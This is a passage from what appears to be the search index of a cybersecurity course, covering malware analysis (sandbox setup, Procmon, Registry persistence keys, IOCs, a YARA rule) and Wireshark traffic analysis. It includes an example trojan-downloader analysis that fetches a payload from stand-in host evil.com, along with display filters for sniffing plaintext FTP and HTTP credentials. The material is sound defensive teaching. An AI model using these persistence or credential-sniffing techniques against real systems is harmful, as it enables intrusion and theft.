DNS queries (C2 domains) # - Extract objects (downloaded files) # - Analyze HTTP/HTTPS connections What to look for: - Command and control (C2) servers - Downloaded payloads - Exfiltrated data - Protocols used - Beaconing intervals Regshot Registry comparison tool: Take snapshot before execution Execute malware Take snapshot after execution Compare snapshots Reveals: - New/modified registry keys - Persistence mechanisms - Configuration changes Malware Behaviors to Identify Persistence Mechanisms How malware survives reboot: Registry Run keys: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Scheduled tasks: C:\\Windows\\System32\\Tasks\\ Services: HKLM\\System\\CurrentControlSet\\Services\\ Startup folder: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ WMI Event Subscriptions: - Fileless persistence - Hard to detect Network Communication Beaconing: - Regular intervals (heartbeat to C2) - Indicates active C2 connection Data exfiltration: - Large outbound transfers - Unusual protocols (DNS tunneling) - Encrypted connections Domain Generation Algorithms (DGA): - Generates many domain names - Tries them until one works - Evades domain blacklisting Process Injection Running code in another process: Techniques: - DLL injection - Process hollowing - APC injection - Reflective DLL injection Why: - Hide malicious code - Evade detection - Elevate privileges - Access process memory Credential Theft Common techniques: - Mimikatz (extract passwords from memory) - Keylogging - Form grabbing (browser) - Credential dumping (SAM, LSASS) Dynamic Analysis in Practice Analysis Workflow 1. Preparation: # Take VM snapshot # Set up monitoring tools # Start Procmon with filters # Start Wireshark capture # Open Process Explorer 2. Execution: # Execute malware # Observe immediate behavior # Let it run for 5-10 minutes # Interact with system (malware might wait) 3. Observation: - What files created/modified? - What registry keys changed? - What network connections made? - What processes spawned? - Any anti-analysis techniques? 4. Documentation: - Screenshot everything - Save logs from all tools - Document timeline of events - Note any unusual behavior 5. Cleanup: # Save artifacts # Revert to clean snapshot # Never boot infected VM again without snapshot Example Analysis Sample: TrojanDownloader.exe Static analysis findings: File: TrojanDownloader.exe MD5: 3bc69e6373cd1e36c6a3eef2b8b30c1e Imports: URLDownloadToFileA, CreateProcessA, RegSetValueExA Strings: http://evil.com/payload.exe, Software\\Microsoft\\Windows\\CurrentVersion\\Run Dynamic analysis findings: File created: C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe Registry modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update = \"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\" Network: Connected to evil.com:80 Process: Created payload.exe Conclusion: - Downloads additional payload from evil.com - Achieves persistence via Run key - Executes downloaded payload - Classic trojan downloader behavior Anti-Analysis Techniques Malware often detects analysis environments. VM Detection Checks for: - VMware artifacts (files, registry keys) - VirtualBox guest additions - Hypervisor instructions - Hardware characteristics (unusual CPU, MAC addresses) Debugger Detection Techniques: - IsDebuggerPresent() API - PEB flags - Timing checks (debugger slower) - Exception handling Sandbox Evasion Malware may: - Sleep for extended periods - Check for mouse movement - Require user interaction - Check for internet connectivity - Validate environment (specific files/registry keys) Obfuscation Code obfuscation: - String encryption - Control flow obfuscation - Dead code insertion - Polymorphic code Creating Indicators of Compromise (IOCs) From analysis, extract IOCs: File-based: - MD5/SHA256 hashes - File names - File sizes - File paths Network-based: - IP addresses - Domain names - URLs - User-agents Registry-based: - Registry keys created/modified - Registry values Behavioral: - Process injection patterns - Service creation - Scheduled task names YARA Rules Create detection signatures: rule TrojanDownloader { meta: description = \"Detects TrojanDownloader\" author = \"Security Team\" date = \"2024-01-01\" strings: $url = \"evil.com\" ascii $registry = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" ascii $api1 = \"URLDownloadToFileA\" ascii $api2 = \"CreateProcessA\" ascii condition: all of ($api*) and ($url or $registry) } Test YARA rule: yara my_rule.yar suspicious_file.exe Automated Analysis Cuckoo Sandbox Automated malware analysis system: Features: - Automated VM execution - Behavior analysis - Network traffic capture - Memory dumps - Screenshots - API call tracing Setup: # Install dependencies sudo apt install python3 python3-pip mongodb postgresql # Install Cuckoo pip3 install cuckoo # Initialize cuckoo init # Configure VMs in conf/virtualbox.conf # Submit samples: cuckoo submit malware.exe Online Sandboxes When you can't set up local analysis: ANY.RUN: - Interactive analysis - Public and private submissions - Real-time interaction Joe Sandbox: - Comprehensive analysis - Multiple OS support - Detailed reports Hybrid Analysis: - Multiple engines - IOC extraction - MITRE ATT&CK mapping VirusTotal: - Multi-engine scanning - Behavior analysis - Community insights Caution: Don't submit sensitive malware publicly! Reporting Findings Analysis Report Structure 1. Executive Summary - Malware type - Threat level - Key findings 2. Technical Details - File information (hashes, size, type) - Static analysis findings - Dynamic analysis findings - Network indicators 3. Indicators of Compromise - File hashes - IPs/domains - Registry keys - Filenames 4. Detection Rules - YARA rules - Snort/Suricata rules - Firewall rules 5. Mitigation Recommendations - Block IOCs - Patch vulnerabilities - Update signatures Key Takeaways Malware analysis workflow: 1. Safety first (isolated environment) 2. Static analysis (understand without executing) 3. Dynamic analysis (observe behavior) 4. Document findings 5. Create IOCs and rules 6. Share intelligence Essential skills: - Safe lab setup - Tool proficiency - Pattern recognition - Documentation - Patience and persistence Remember: - Always use isolated VMs - Snapshot before analysis - Never analyze on production systems - Document everything - Share findings responsibly Malware analysis is part art, part science. The more samples you analyze, the better you'll become at spotting patterns and understanding malicious behavior. Next, we'll explore more advanced topics in traffic analysis and network forensics.","title":"Lesson 5.3"},{"location":"LECTURES/unit5/lesson5-3/#malware-analysis-fundamentals","text":"Understanding malware is critical for defense. This lesson teaches you how to safely analyze malicious software to understand its behavior, capabilities, and how to detect it.","title":"Malware Analysis Fundamentals"},{"location":"LECTURES/unit5/lesson5-3/#safety-first","text":"NEVER analyze malware on your main system!","title":"Safety First"},{"location":"LECTURES/unit5/lesson5-3/#safe-analysis-environment","text":"Requirements: 1. Isolated VM : No network access to your main network 2. Snapshots : Take snapshot before analysis, revert after 3. Network isolation : Host-only or isolated network 4. Monitoring tools : Process monitor, network monitor, API monitor 5. Backups : Everything backed up before starting Recommended setup: Host Machine (Your computer) \u2193 Virtual Machine (Isolated) \u251c\u2500 No shared folders \u251c\u2500 No clipboard sharing \u251c\u2500 Host-only network (optional) \u2514\u2500 Snapshot before analysis Tools for analysis VM: - Windows 10 (most malware targets Windows) - REMnux (Linux distro for malware analysis) - FLARE VM (Windows malware analysis distribution)","title":"Safe Analysis Environment"},{"location":"LECTURES/unit5/lesson5-3/#types-of-malware-analysis","text":"","title":"Types of Malware Analysis"},{"location":"LECTURES/unit5/lesson5-3/#static-analysis","text":"Examine without executing. Basic static analysis: - File properties (size, type, creation date) - Strings extraction - PE header analysis - Hash calculation - VirusTotal lookup Advanced static analysis: - Disassembly - Decompilation - Code analysis - Signature creation","title":"Static Analysis"},{"location":"LECTURES/unit5/lesson5-3/#dynamic-analysis","text":"Execute and observe behavior. What to monitor: - File system changes - Registry modifications - Network connections - Process creation - API calls - Memory modifications","title":"Dynamic Analysis"},{"location":"LECTURES/unit5/lesson5-3/#hybrid-analysis","text":"Combination of static and dynamic. - Static analysis first (safer) - Dynamic analysis to confirm findings - Iterative process","title":"Hybrid Analysis"},{"location":"LECTURES/unit5/lesson5-3/#static-analysis-tools-and-techniques","text":"","title":"Static Analysis Tools and Techniques"},{"location":"LECTURES/unit5/lesson5-3/#file-identification","text":"# File type file suspicious.exe # Calculate hashes md5sum suspicious.exe sha1sum suspicious.exe sha256sum suspicious.exe # Detailed file info exiftool suspicious.exe","title":"File Identification"},{"location":"LECTURES/unit5/lesson5-3/#strings-analysis","text":"# Extract strings (minimum 8 characters) strings -n 8 suspicious.exe > strings.txt # Look for interesting strings grep -i \"http\" strings.txt grep -i \"password\" strings.txt grep -i \"\\.exe\" strings.txt grep -i \"cmd\" strings.txt # Unicode strings strings -el suspicious.exe What to look for: - URLs and IP addresses - File paths - Registry keys - Function names - Error messages - Embedded files - Encryption keys","title":"Strings Analysis"},{"location":"LECTURES/unit5/lesson5-3/#pe-header-analysis","text":"Use PEview, PE-bear, or pestudio: Important sections: - Import table : What DLLs/functions it uses - Export table : Functions it provides - Resources : Embedded files, icons - Sections : Code, data, resources Suspicious indicators: - Unusual entry point - Packed/compressed sections (high entropy) - Suspicious imports (network, process manipulation) - Modified timestamps - Unusual section names","title":"PE Header Analysis"},{"location":"LECTURES/unit5/lesson5-3/#detecting-packers","text":"Packers compress/encrypt malware to evade detection. # Detect packer upx -t suspicious.exe # Check if UPX packed # Entropy analysis (high entropy = packed/encrypted) # Use pe-studio or similar tool Common packers: - UPX - ASPack - PECompact - Themida - VMProtect Unpacking: - Some packers can be reversed (UPX: upx -d file.exe ) - Others require manual unpacking or debugging","title":"Detecting Packers"},{"location":"LECTURES/unit5/lesson5-3/#dynamic-analysis-tools","text":"","title":"Dynamic Analysis Tools"},{"location":"LECTURES/unit5/lesson5-3/#process-monitor-procmon","text":"Windows Sysinternals tool - essential for dynamic analysis. Setup filters: Process Name is malware.exe Operation begins with Write Path contains HKCU\\Software What to monitor: - File operations (Create, Write, Delete) - Registry operations (RegSetValue, RegCreateKey) - Network operations (TCP/UDP connects) - Process operations (Process Create, Thread Create) Common malware behaviors: - Creating files in Temp or AppData - Modifying Run keys (persistence) - Modifying firewall settings - Dropping additional files - Injecting into other processes","title":"Process Monitor (Procmon)"},{"location":"LECTURES/unit5/lesson5-3/#process-explorer","text":"View running processes and their properties: - Memory usage - Handles (files, registry keys open) - DLLs loaded - Network connections - Strings in memory Suspicious indicators: - Unsigned executables - Unusual parent-child relationships - Process injection - Hidden processes","title":"Process Explorer"},{"location":"LECTURES/unit5/lesson5-3/#wireshark-tcpdump","text":"Monitor network traffic: # Capture all traffic sudo tcpdump -i any -w malware_traffic.pcap # In Wireshark: # - Filter by malware's IP # - Look for DNS queries (C2 domains) # - Extract objects (downloaded files) # - Analyze HTTP/HTTPS connections What to look for: - Command and control (C2) servers - Downloaded payloads - Exfiltrated data - Protocols used - Beaconing intervals","title":"Wireshark / tcpdump"},{"location":"LECTURES/unit5/lesson5-3/#regshot","text":"Registry comparison tool: Take snapshot before execution Execute malware Take snapshot after execution Compare snapshots Reveals: - New/modified registry keys - Persistence mechanisms - Configuration changes","title":"Regshot"},{"location":"LECTURES/unit5/lesson5-3/#malware-behaviors-to-identify","text":"","title":"Malware Behaviors to Identify"},{"location":"LECTURES/unit5/lesson5-3/#persistence-mechanisms","text":"How malware survives reboot: Registry Run keys: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Scheduled tasks: C:\\Windows\\System32\\Tasks\\ Services: HKLM\\System\\CurrentControlSet\\Services\\ Startup folder: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ WMI Event Subscriptions: - Fileless persistence - Hard to detect","title":"Persistence Mechanisms"},{"location":"LECTURES/unit5/lesson5-3/#network-communication","text":"Beaconing: - Regular intervals (heartbeat to C2) - Indicates active C2 connection Data exfiltration: - Large outbound transfers - Unusual protocols (DNS tunneling) - Encrypted connections Domain Generation Algorithms (DGA): - Generates many domain names - Tries them until one works - Evades domain blacklisting","title":"Network Communication"},{"location":"LECTURES/unit5/lesson5-3/#process-injection","text":"Running code in another process: Techniques: - DLL injection - Process hollowing - APC injection - Reflective DLL injection Why: - Hide malicious code - Evade detection - Elevate privileges - Access process memory","title":"Process Injection"},{"location":"LECTURES/unit5/lesson5-3/#credential-theft","text":"Common techniques: - Mimikatz (extract passwords from memory) - Keylogging - Form grabbing (browser) - Credential dumping (SAM, LSASS)","title":"Credential Theft"},{"location":"LECTURES/unit5/lesson5-3/#dynamic-analysis-in-practice","text":"","title":"Dynamic Analysis in Practice"},{"location":"LECTURES/unit5/lesson5-3/#analysis-workflow","text":"1. Preparation: # Take VM snapshot # Set up monitoring tools # Start Procmon with filters # Start Wireshark capture # Open Process Explorer 2. Execution: # Execute malware # Observe immediate behavior # Let it run for 5-10 minutes # Interact with system (malware might wait) 3. Observation: - What files created/modified? - What registry keys changed? - What network connections made? - What processes spawned? - Any anti-analysis techniques? 4. Documentation: - Screenshot everything - Save logs from all tools - Document timeline of events - Note any unusual behavior 5. Cleanup: # Save artifacts # Revert to clean snapshot # Never boot infected VM again without snapshot","title":"Analysis Workflow"},{"location":"LECTURES/unit5/lesson5-3/#example-analysis","text":"Sample: TrojanDownloader.exe Static analysis findings: File: TrojanDownloader.exe MD5: 3bc69e6373cd1e36c6a3eef2b8b30c1e Imports: URLDownloadToFileA, CreateProcessA, RegSetValueExA Strings: http://evil.com/payload.exe, Software\\Microsoft\\Windows\\CurrentVersion\\Run Dynamic analysis findings: File created: C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe Registry modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update = \"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\" Network: Connected to evil.com:80 Process: Created payload.exe Conclusion: - Downloads additional payload from evil.com - Achieves persistence via Run key - Executes downloaded payload - Classic trojan downloader behavior","title":"Example Analysis"},{"location":"LECTURES/unit5/lesson5-3/#anti-analysis-techniques","text":"Malware often detects analysis environments.","title":"Anti-Analysis Techniques"},{"location":"LECTURES/unit5/lesson5-3/#vm-detection","text":"Checks for: - VMware artifacts (files, registry keys) - VirtualBox guest additions - Hypervisor instructions - Hardware characteristics (unusual CPU, MAC addresses)","title":"VM Detection"},{"location":"LECTURES/unit5/lesson5-3/#debugger-detection","text":"Techniques: - IsDebuggerPresent() API - PEB flags - Timing checks (debugger slower) - Exception handling","title":"Debugger Detection"},{"location":"LECTURES/unit5/lesson5-3/#sandbox-evasion","text":"Malware may: - Sleep for extended periods - Check for mouse movement - Require user interaction - Check for internet connectivity - Validate environment (specific files/registry keys)","title":"Sandbox Evasion"},{"location":"LECTURES/unit5/lesson5-3/#obfuscation","text":"Code obfuscation: - String encryption - Control flow obfuscation - Dead code insertion - Polymorphic code","title":"Obfuscation"},{"location":"LECTURES/unit5/lesson5-3/#creating-indicators-of-compromise-iocs","text":"From analysis, extract IOCs: File-based: - MD5/SHA256 hashes - File names - File sizes - File paths Network-based: - IP addresses - Domain names - URLs - User-agents Registry-based: - Registry keys created/modified - Registry values Behavioral: - Process injection patterns - Service creation - Scheduled task names","title":"Creating Indicators of Compromise (IOCs)"},{"location":"LECTURES/unit5/lesson5-3/#yara-rules","text":"Create detection signatures: rule TrojanDownloader { meta: description = \"Detects TrojanDownloader\" author = \"Security Team\" date = \"2024-01-01\" strings: $url = \"evil.com\" ascii $registry = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" ascii $api1 = \"URLDownloadToFileA\" ascii $api2 = \"CreateProcessA\" ascii condition: all of ($api*) and ($url or $registry) } Test YARA rule: yara my_rule.yar suspicious_file.exe","title":"YARA Rules"},{"location":"LECTURES/unit5/lesson5-3/#automated-analysis","text":"","title":"Automated Analysis"},{"location":"LECTURES/unit5/lesson5-3/#cuckoo-sandbox","text":"Automated malware analysis system: Features: - Automated VM execution - Behavior analysis - Network traffic capture - Memory dumps - Screenshots - API call tracing Setup: # Install dependencies sudo apt install python3 python3-pip mongodb postgresql # Install Cuckoo pip3 install cuckoo # Initialize cuckoo init # Configure VMs in conf/virtualbox.conf # Submit samples: cuckoo submit malware.exe","title":"Cuckoo Sandbox"},{"location":"LECTURES/unit5/lesson5-3/#online-sandboxes","text":"When you can't set up local analysis: ANY.RUN: - Interactive analysis - Public and private submissions - Real-time interaction Joe Sandbox: - Comprehensive analysis - Multiple OS support - Detailed reports Hybrid Analysis: - Multiple engines - IOC extraction - MITRE ATT&CK mapping VirusTotal: - Multi-engine scanning - Behavior analysis - Community insights Caution: Don't submit sensitive malware publicly!","title":"Online Sandboxes"},{"location":"LECTURES/unit5/lesson5-3/#reporting-findings","text":"","title":"Reporting Findings"},{"location":"LECTURES/unit5/lesson5-3/#analysis-report-structure","text":"1. Executive Summary - Malware type - Threat level - Key findings 2. Technical Details - File information (hashes, size, type) - Static analysis findings - Dynamic analysis findings - Network indicators 3. Indicators of Compromise - File hashes - IPs/domains - Registry keys - Filenames 4. Detection Rules - YARA rules - Snort/Suricata rules - Firewall rules 5. Mitigation Recommendations - Block IOCs - Patch vulnerabilities - Update signatures","title":"Analysis Report Structure"},{"location":"LECTURES/unit5/lesson5-3/#key-takeaways","text":"Malware analysis workflow: 1. Safety first (isolated environment) 2. Static analysis (understand without executing) 3. Dynamic analysis (observe behavior) 4. Document findings 5. Create IOCs and rules 6. Share intelligence Essential skills: - Safe lab setup - Tool proficiency - Pattern recognition - Documentation - Patience and persistence Remember: - Always use isolated VMs - Snapshot before analysis - Never analyze on production systems - Document everything - Share findings responsibly Malware analysis is part art, part science. The more samples you analyze, the better you'll become at spotting patterns and understanding malicious behavior. Next, we'll explore more advanced topics in traffic analysis and network forensics.","title":"Key Takeaways"},{"location":"LECTURES/unit6/lesson6-1/","text":"Network Traffic Analysis with Wireshark You've learned about networks, protocols, and security. Now it's time to see network traffic in action. Wireshark is the industry-standard tool for capturing and analyzing network packets. If you want to understand what's really happening on a network, you need to master Wireshark. What is Wireshark? Wireshark is a free, open-source packet analyzer. It captures network traffic in real-time and displays it in human-readable format. Think of it as a microscope for networks\u2014it lets you examine every single packet flowing across the wire. Security professionals use Wireshark to: - Troubleshoot network issues - Detect malicious activity - Reverse engineer protocols - Analyze malware communication - Investigate security incidents - Learn how protocols actually work - Capture credentials (in authorized testing) - Verify encryption is working Wireshark is so powerful and essential that it's installed by default on Kali Linux and used daily by security professionals worldwide. Understanding Packet Capture Before we dive into Wireshark, let's understand what we're capturing. Promiscuous Mode Normally, your network card only captures packets addressed to you. In promiscuous mode , your network card captures all packets on the network segment, regardless of destination. This is essential for security analysis but also why packet sniffing can be a privacy concern. Note: On switched networks, you usually only see: - Broadcast traffic - Multicast traffic - Traffic to/from your machine To see other traffic, you'd need to be on a hub (rare today), use ARP poisoning to redirect traffic through your machine, or have access to network tap/SPAN port. Capture Filters vs. Display Filters Capture filters : Applied during capture, determine what packets are saved. More efficient but can't be changed after capture. Display filters : Applied after capture, determine what you see. Can be changed anytime without recapturing. Both use different syntax\u2014capture filters use BPF (Berkeley Packet Filter), display filters use Wireshark's own syntax. Getting Started with Wireshark The Interface When you open Wireshark, you see: - Interface list : Network interfaces you can capture from - Capture pane : Real-time packet list during capture - Packet details pane : Expanded view of selected packet - Packet bytes pane : Raw hexadecimal and ASCII data Capturing Your First Packets Select a network interface (usually your active connection) Click the blue shark fin icon to start capture Generate some traffic (visit a website) Click the red square to stop capture Examine the results Each row represents one packet with columns: - No. : Packet number - Time : When packet was captured - Source : Source IP address - Destination : Destination IP address - Protocol : Protocol used (TCP, UDP, HTTP, etc.) - Length : Packet size in bytes - Info : Summary of packet contents Understanding the Packet Details Click on any packet to see three views: Packet List : The summary row Packet Details : Expandable tree showing each protocol layer: - Frame: Physical layer info - Ethernet II: Data link layer (MAC addresses) - Internet Protocol: Network layer (IP addresses) - TCP/UDP: Transport layer (ports, flags) - Application data: Whatever protocol is inside (HTTP, DNS, etc.) Packet Bytes : Raw data in hex and ASCII This three-pane view is Wireshark's power\u2014you can see the same packet at different levels of detail. Display Filters: Finding What Matters With thousands or millions of packets, you need to filter. Display filters are Wireshark's query language. Basic Display Filter Syntax Filter by protocol: http tcp dns icmp Filter by IP address: ip.addr == 192.168.1.1 # Any direction ip.src == 192.168.1.1 # Source only ip.dst == 192.168.1.1 # Destination only Filter by port: tcp.port == 80 # Any direction tcp.srcport == 443 # Source port tcp.dstport == 22 # Destination port Combine filters: ip.addr == 192.168.1.1 && tcp.port == 80 http || dns tcp.port == 443 && ip.src == 10.0.0.5 Logical operators: - && or and : Both conditions must be true - || or or : Either condition true - ! or not : Negation Common Security Filters Find login credentials (if not encrypted): http.request.method == \"POST\" ftp.request.command == \"PASS\" Find DNS queries: dns.qry.name contains \"malicious\" Find TCP connections: tcp.flags.syn == 1 && tcp.flags.ack == 0 Find specific HTTP methods: http.request.method == \"POST\" http.request.uri contains \"/admin\" Find errors: http.response.code >= 400 tcp.analysis.retransmission Find large packets (potential data exfiltration): frame.len > 1000 Find suspicious user agents: http.user_agent contains \"sqlmap\" http.user_agent contains \"nikto\" Analyzing Common Protocols HTTP Traffic HTTP is unencrypted and reveals everything. Let's analyze an HTTP request: GET /index.html HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 Accept: text/html In Wireshark: 1. Filter for http 2. Find a GET request 3. Right-click \u2192 Follow \u2192 HTTP Stream 4. See the entire conversation in plain text You can see: - URLs visited - Cookies - Form data - User agents - Server responses Security note : This is why HTTPS is crucial. HTTP traffic is completely visible to anyone on the network. HTTPS Traffic HTTPS encrypts HTTP, so you'll see: - TLS handshake (establishing encryption) - Encrypted application data (unreadable) - Certificate information (visible during handshake) Filter: tls or ssl You can see: - Which sites are visited (from SNI in Client Hello) - IP addresses - Certificate validity - TLS version - Cipher suites But you can't see: - Specific URLs - Transmitted data - Cookies or credentials DNS Traffic DNS queries reveal a lot about user activity: Filter: dns You can see: - What domains are being resolved - Response IP addresses - Query types (A, AAAA, MX, TXT, etc.) Security uses: - Detect DNS tunneling (data exfiltration through DNS) - Find connections to known malicious domains - Identify command and control traffic - Spot DGA (Domain Generation Algorithm) patterns Example filter for DNS queries only: dns.flags.response == 0 TCP Three-Way Handshake Understanding TCP handshakes is fundamental: SYN : Client \u2192 Server (initiating connection) SYN-ACK : Server \u2192 Client (acknowledging and returning SYN) ACK : Client \u2192 Server (acknowledging server's SYN) Filter to see only handshakes: tcp.flags.syn == 1 What this reveals: - Which services are being accessed - Successful vs. failed connections - Port scanning activity (many SYNs, few ACKs) FTP Traffic (Unencrypted File Transfer) FTP sends credentials in plaintext: Filter: ftp You'll see: - USER command (username) - PASS command (password in plain text!) - File transfers - Directory listings Right-click a packet \u2192 Follow \u2192 TCP Stream to see the entire session. Security lesson : FTP is incredibly insecure. Use SFTP or FTPS instead. Detecting Attacks with Wireshark Port Scanning SYN Scan : Many SYN packets to different ports, few responses tcp.flags.syn == 1 && tcp.flags.ack == 0 Look for: - Single source IP - Many different destination ports - High packet rate - Many RST responses (closed ports) ARP Spoofing ARP poisoning redirects traffic by lying about MAC addresses. Filter: arp Look for: - Duplicate IP addresses with different MACs - Many ARP replies without corresponding requests - Gratuitous ARP (announcements without requests) Filter for duplicate IPs: arp.duplicate-address-detected Malware Communication Indicators: - Unusual ports - Suspicious domains in DNS queries - Regular beacon intervals (malware checking in) - Large uploads (data exfiltration) - Connections to known malicious IPs Filter for beaconing (regular intervals): tcp && frame.time_delta > 60 && frame.time_delta < 61 Password Sniffing If credentials are sent unencrypted: HTTP authentication: http.authbasic FTP passwords: ftp.request.command == \"PASS\" Telnet login: telnet && tcp.port == 23 Right-click \u2192 Follow Stream to see full credential exchange. Advanced Wireshark Techniques Statistics and Analysis Protocol Hierarchy : Statistics \u2192 Protocol Hierarchy - Shows breakdown of all protocols in capture - Identifies unusual traffic Conversations : Statistics \u2192 Conversations - Lists all pairs of communicating hosts - Shows data transferred - Identifies heavy users or data transfers I/O Graphs : Statistics \u2192 I/O Graph - Visualizes traffic over time - Spots spikes or patterns - Useful for DDoS analysis Following Streams Right-click any packet \u2192 Follow \u2192 [protocol] Stream Shows entire conversation in readable format. Works for: - TCP Stream - UDP Stream - HTTP Stream - TLS Stream (shows encrypted data) Exporting Objects For HTTP/HTTPS captures: File \u2192 Export Objects \u2192 HTTP Extracts all files transferred: - Images - JavaScript - CSS - Downloads - Malware samples (be careful!) Time Display Formats View \u2192 Time Display Format - Seconds since beginning of capture - Absolute time - Delta time (since previous packet) Useful for identifying timing patterns. Coloring Rules View \u2192 Coloring Rules Wireshark colors packets by default: - Light blue: UDP - Light purple: TCP - Black: Errors - Green: HTTP - Light yellow: Windows-specific traffic You can create custom rules: tcp.analysis.retransmission \u2192 Red (possible network issues) dns.qry.name contains \"malware\" \u2192 Red (suspicious DNS) Capturing Strategies Targeted Capture Don't capture everything\u2014be specific: Capture filter for HTTP only: port 80 or port 443 Capture specific host: host 192.168.1.100 Capture subnet: net 192.168.1.0/24 Exclude broadcast noise: not broadcast and not multicast Ring Buffer for Long-Term Capture For continuous monitoring: 1. Capture \u2192 Options 2. Enable \"Use multiple files\" 3. Set ring buffer (e.g., 100 files of 10 MB each) 4. Wireshark automatically rotates files Remote Capture Capture on one machine, analyze on another: 1. Set up tcpdump on remote server 2. Pipe traffic to Wireshark on local machine ssh user@remote \"tcpdump -i eth0 -w -\" | wireshark -k -i - Practical Scenarios Scenario 1: Investigating Slow Network Start capture on affected user's system Reproduce the problem Statistics \u2192 Protocol Hierarchy Look for unusual protocols or heavy usage Check for retransmissions: tcp.analysis.retransmission Examine high-traffic conversations Scenario 2: Suspected Data Exfiltration Capture traffic from suspected system Statistics \u2192 Conversations \u2192 sort by bytes Look for large uploads to unusual destinations Check DNS queries for suspicious domains Follow streams to examine content Export objects to find transferred files Scenario 3: Malware Analysis Capture traffic in isolated VM Execute malware sample Stop capture after observable activity Filter DNS queries: identify C2 domains Filter HTTP/HTTPS: identify beacon patterns Check for protocols on unusual ports Export malware downloads Best Practices Capture with permission : Only on networks you own or have authorization Secure captures : Packet captures may contain sensitive data Use appropriate filters : Don't capture more than needed Save important captures : They're evidence Document findings : Note unusual patterns Practice regularly : Skills improve with use Stay updated : New protocols and attacks emerge constantly Legal and Ethical Considerations Important : Packet capture can reveal: - Passwords and credentials - Private communications - Financial information - Medical records - Trade secrets Rules: - Only capture on networks you own or have written permission - Don't capture in public Wi-Fi without authorization - Treat captured data as highly sensitive - Follow company security policies - Understand local laws on network monitoring In many jurisdictions, unauthorized packet capture is illegal wiretapping. Tools That Complement Wireshark tcpdump : Command-line packet capture (often used on servers) tcpdump -i eth0 -w capture.pcap port 80 tshark : Command-line version of Wireshark (great for scripting) tshark -r capture.pcap -Y http.request -T fields -e http.host NetworkMiner : Extracts artifacts from pcap files CapAnalysis : Web-based pcap analyzer Zeek (formerly Bro): Network security monitoring platform What's Next Wireshark is a skill that develops over time. Start by: 1. Capturing your own web browsing 2. Analyzing different protocols 3. Practicing with public pcap files 4. Participating in CTF challenges 5. Contributing to investigations In upcoming lessons, we'll use Wireshark to analyze specific attack scenarios and learn how to detect sophisticated threats. Every security professional needs packet analysis skills\u2014it's the ground truth of what's really happening on a network. Keep practicing, and you'll develop an intuition for what's normal vs. suspicious in network traffic. That intuition is invaluable in cybersecurity.","title":"Lesson 6.1"},{"location":"LECTURES/unit6/lesson6-1/#network-traffic-analysis-with-wireshark","text":"You've learned about networks, protocols, and security. Now it's time to see network traffic in action. Wireshark is the industry-standard tool for capturing and analyzing network packets. If you want to understand what's really happening on a network, you need to master Wireshark.","title":"Network Traffic Analysis with Wireshark"},{"location":"LECTURES/unit6/lesson6-1/#what-is-wireshark","text":"Wireshark is a free, open-source packet analyzer. It captures network traffic in real-time and displays it in human-readable format. Think of it as a microscope for networks\u2014it lets you examine every single packet flowing across the wire. Security professionals use Wireshark to: - Troubleshoot network issues - Detect malicious activity - Reverse engineer protocols - Analyze malware communication - Investigate security incidents - Learn how protocols actually work - Capture credentials (in authorized testing) - Verify encryption is working Wireshark is so powerful and essential that it's installed by default on Kali Linux and used daily by security professionals worldwide.","title":"What is Wireshark?"},{"location":"LECTURES/unit6/lesson6-1/#understanding-packet-capture","text":"Before we dive into Wireshark, let's understand what we're capturing.","title":"Understanding Packet Capture"},{"location":"LECTURES/unit6/lesson6-1/#promiscuous-mode","text":"Normally, your network card only captures packets addressed to you. In promiscuous mode , your network card captures all packets on the network segment, regardless of destination. This is essential for security analysis but also why packet sniffing can be a privacy concern. Note: On switched networks, you usually only see: - Broadcast traffic - Multicast traffic - Traffic to/from your machine To see other traffic, you'd need to be on a hub (rare today), use ARP poisoning to redirect traffic through your machine, or have access to network tap/SPAN port.","title":"Promiscuous Mode"},{"location":"LECTURES/unit6/lesson6-1/#capture-filters-vs-display-filters","text":"Capture filters : Applied during capture, determine what packets are saved. More efficient but can't be changed after capture. Display filters : Applied after capture, determine what you see. Can be changed anytime without recapturing. Both use different syntax\u2014capture filters use BPF (Berkeley Packet Filter), display filters use Wireshark's own syntax.","title":"Capture Filters vs. Display Filters"},{"location":"LECTURES/unit6/lesson6-1/#getting-started-with-wireshark","text":"","title":"Getting Started with Wireshark"},{"location":"LECTURES/unit6/lesson6-1/#the-interface","text":"When you open Wireshark, you see: - Interface list : Network interfaces you can capture from - Capture pane : Real-time packet list during capture - Packet details pane : Expanded view of selected packet - Packet bytes pane : Raw hexadecimal and ASCII data","title":"The Interface"},{"location":"LECTURES/unit6/lesson6-1/#capturing-your-first-packets","text":"Select a network interface (usually your active connection) Click the blue shark fin icon to start capture Generate some traffic (visit a website) Click the red square to stop capture Examine the results Each row represents one packet with columns: - No. : Packet number - Time : When packet was captured - Source : Source IP address - Destination : Destination IP address - Protocol : Protocol used (TCP, UDP, HTTP, etc.) - Length : Packet size in bytes - Info : Summary of packet contents","title":"Capturing Your First Packets"},{"location":"LECTURES/unit6/lesson6-1/#understanding-the-packet-details","text":"Click on any packet to see three views: Packet List : The summary row Packet Details : Expandable tree showing each protocol layer: - Frame: Physical layer info - Ethernet II: Data link layer (MAC addresses) - Internet Protocol: Network layer (IP addresses) - TCP/UDP: Transport layer (ports, flags) - Application data: Whatever protocol is inside (HTTP, DNS, etc.) Packet Bytes : Raw data in hex and ASCII This three-pane view is Wireshark's power\u2014you can see the same packet at different levels of detail.","title":"Understanding the Packet Details"},{"location":"LECTURES/unit6/lesson6-1/#display-filters-finding-what-matters","text":"With thousands or millions of packets, you need to filter. Display filters are Wireshark's query language.","title":"Display Filters: Finding What Matters"},{"location":"LECTURES/unit6/lesson6-1/#basic-display-filter-syntax","text":"Filter by protocol: http tcp dns 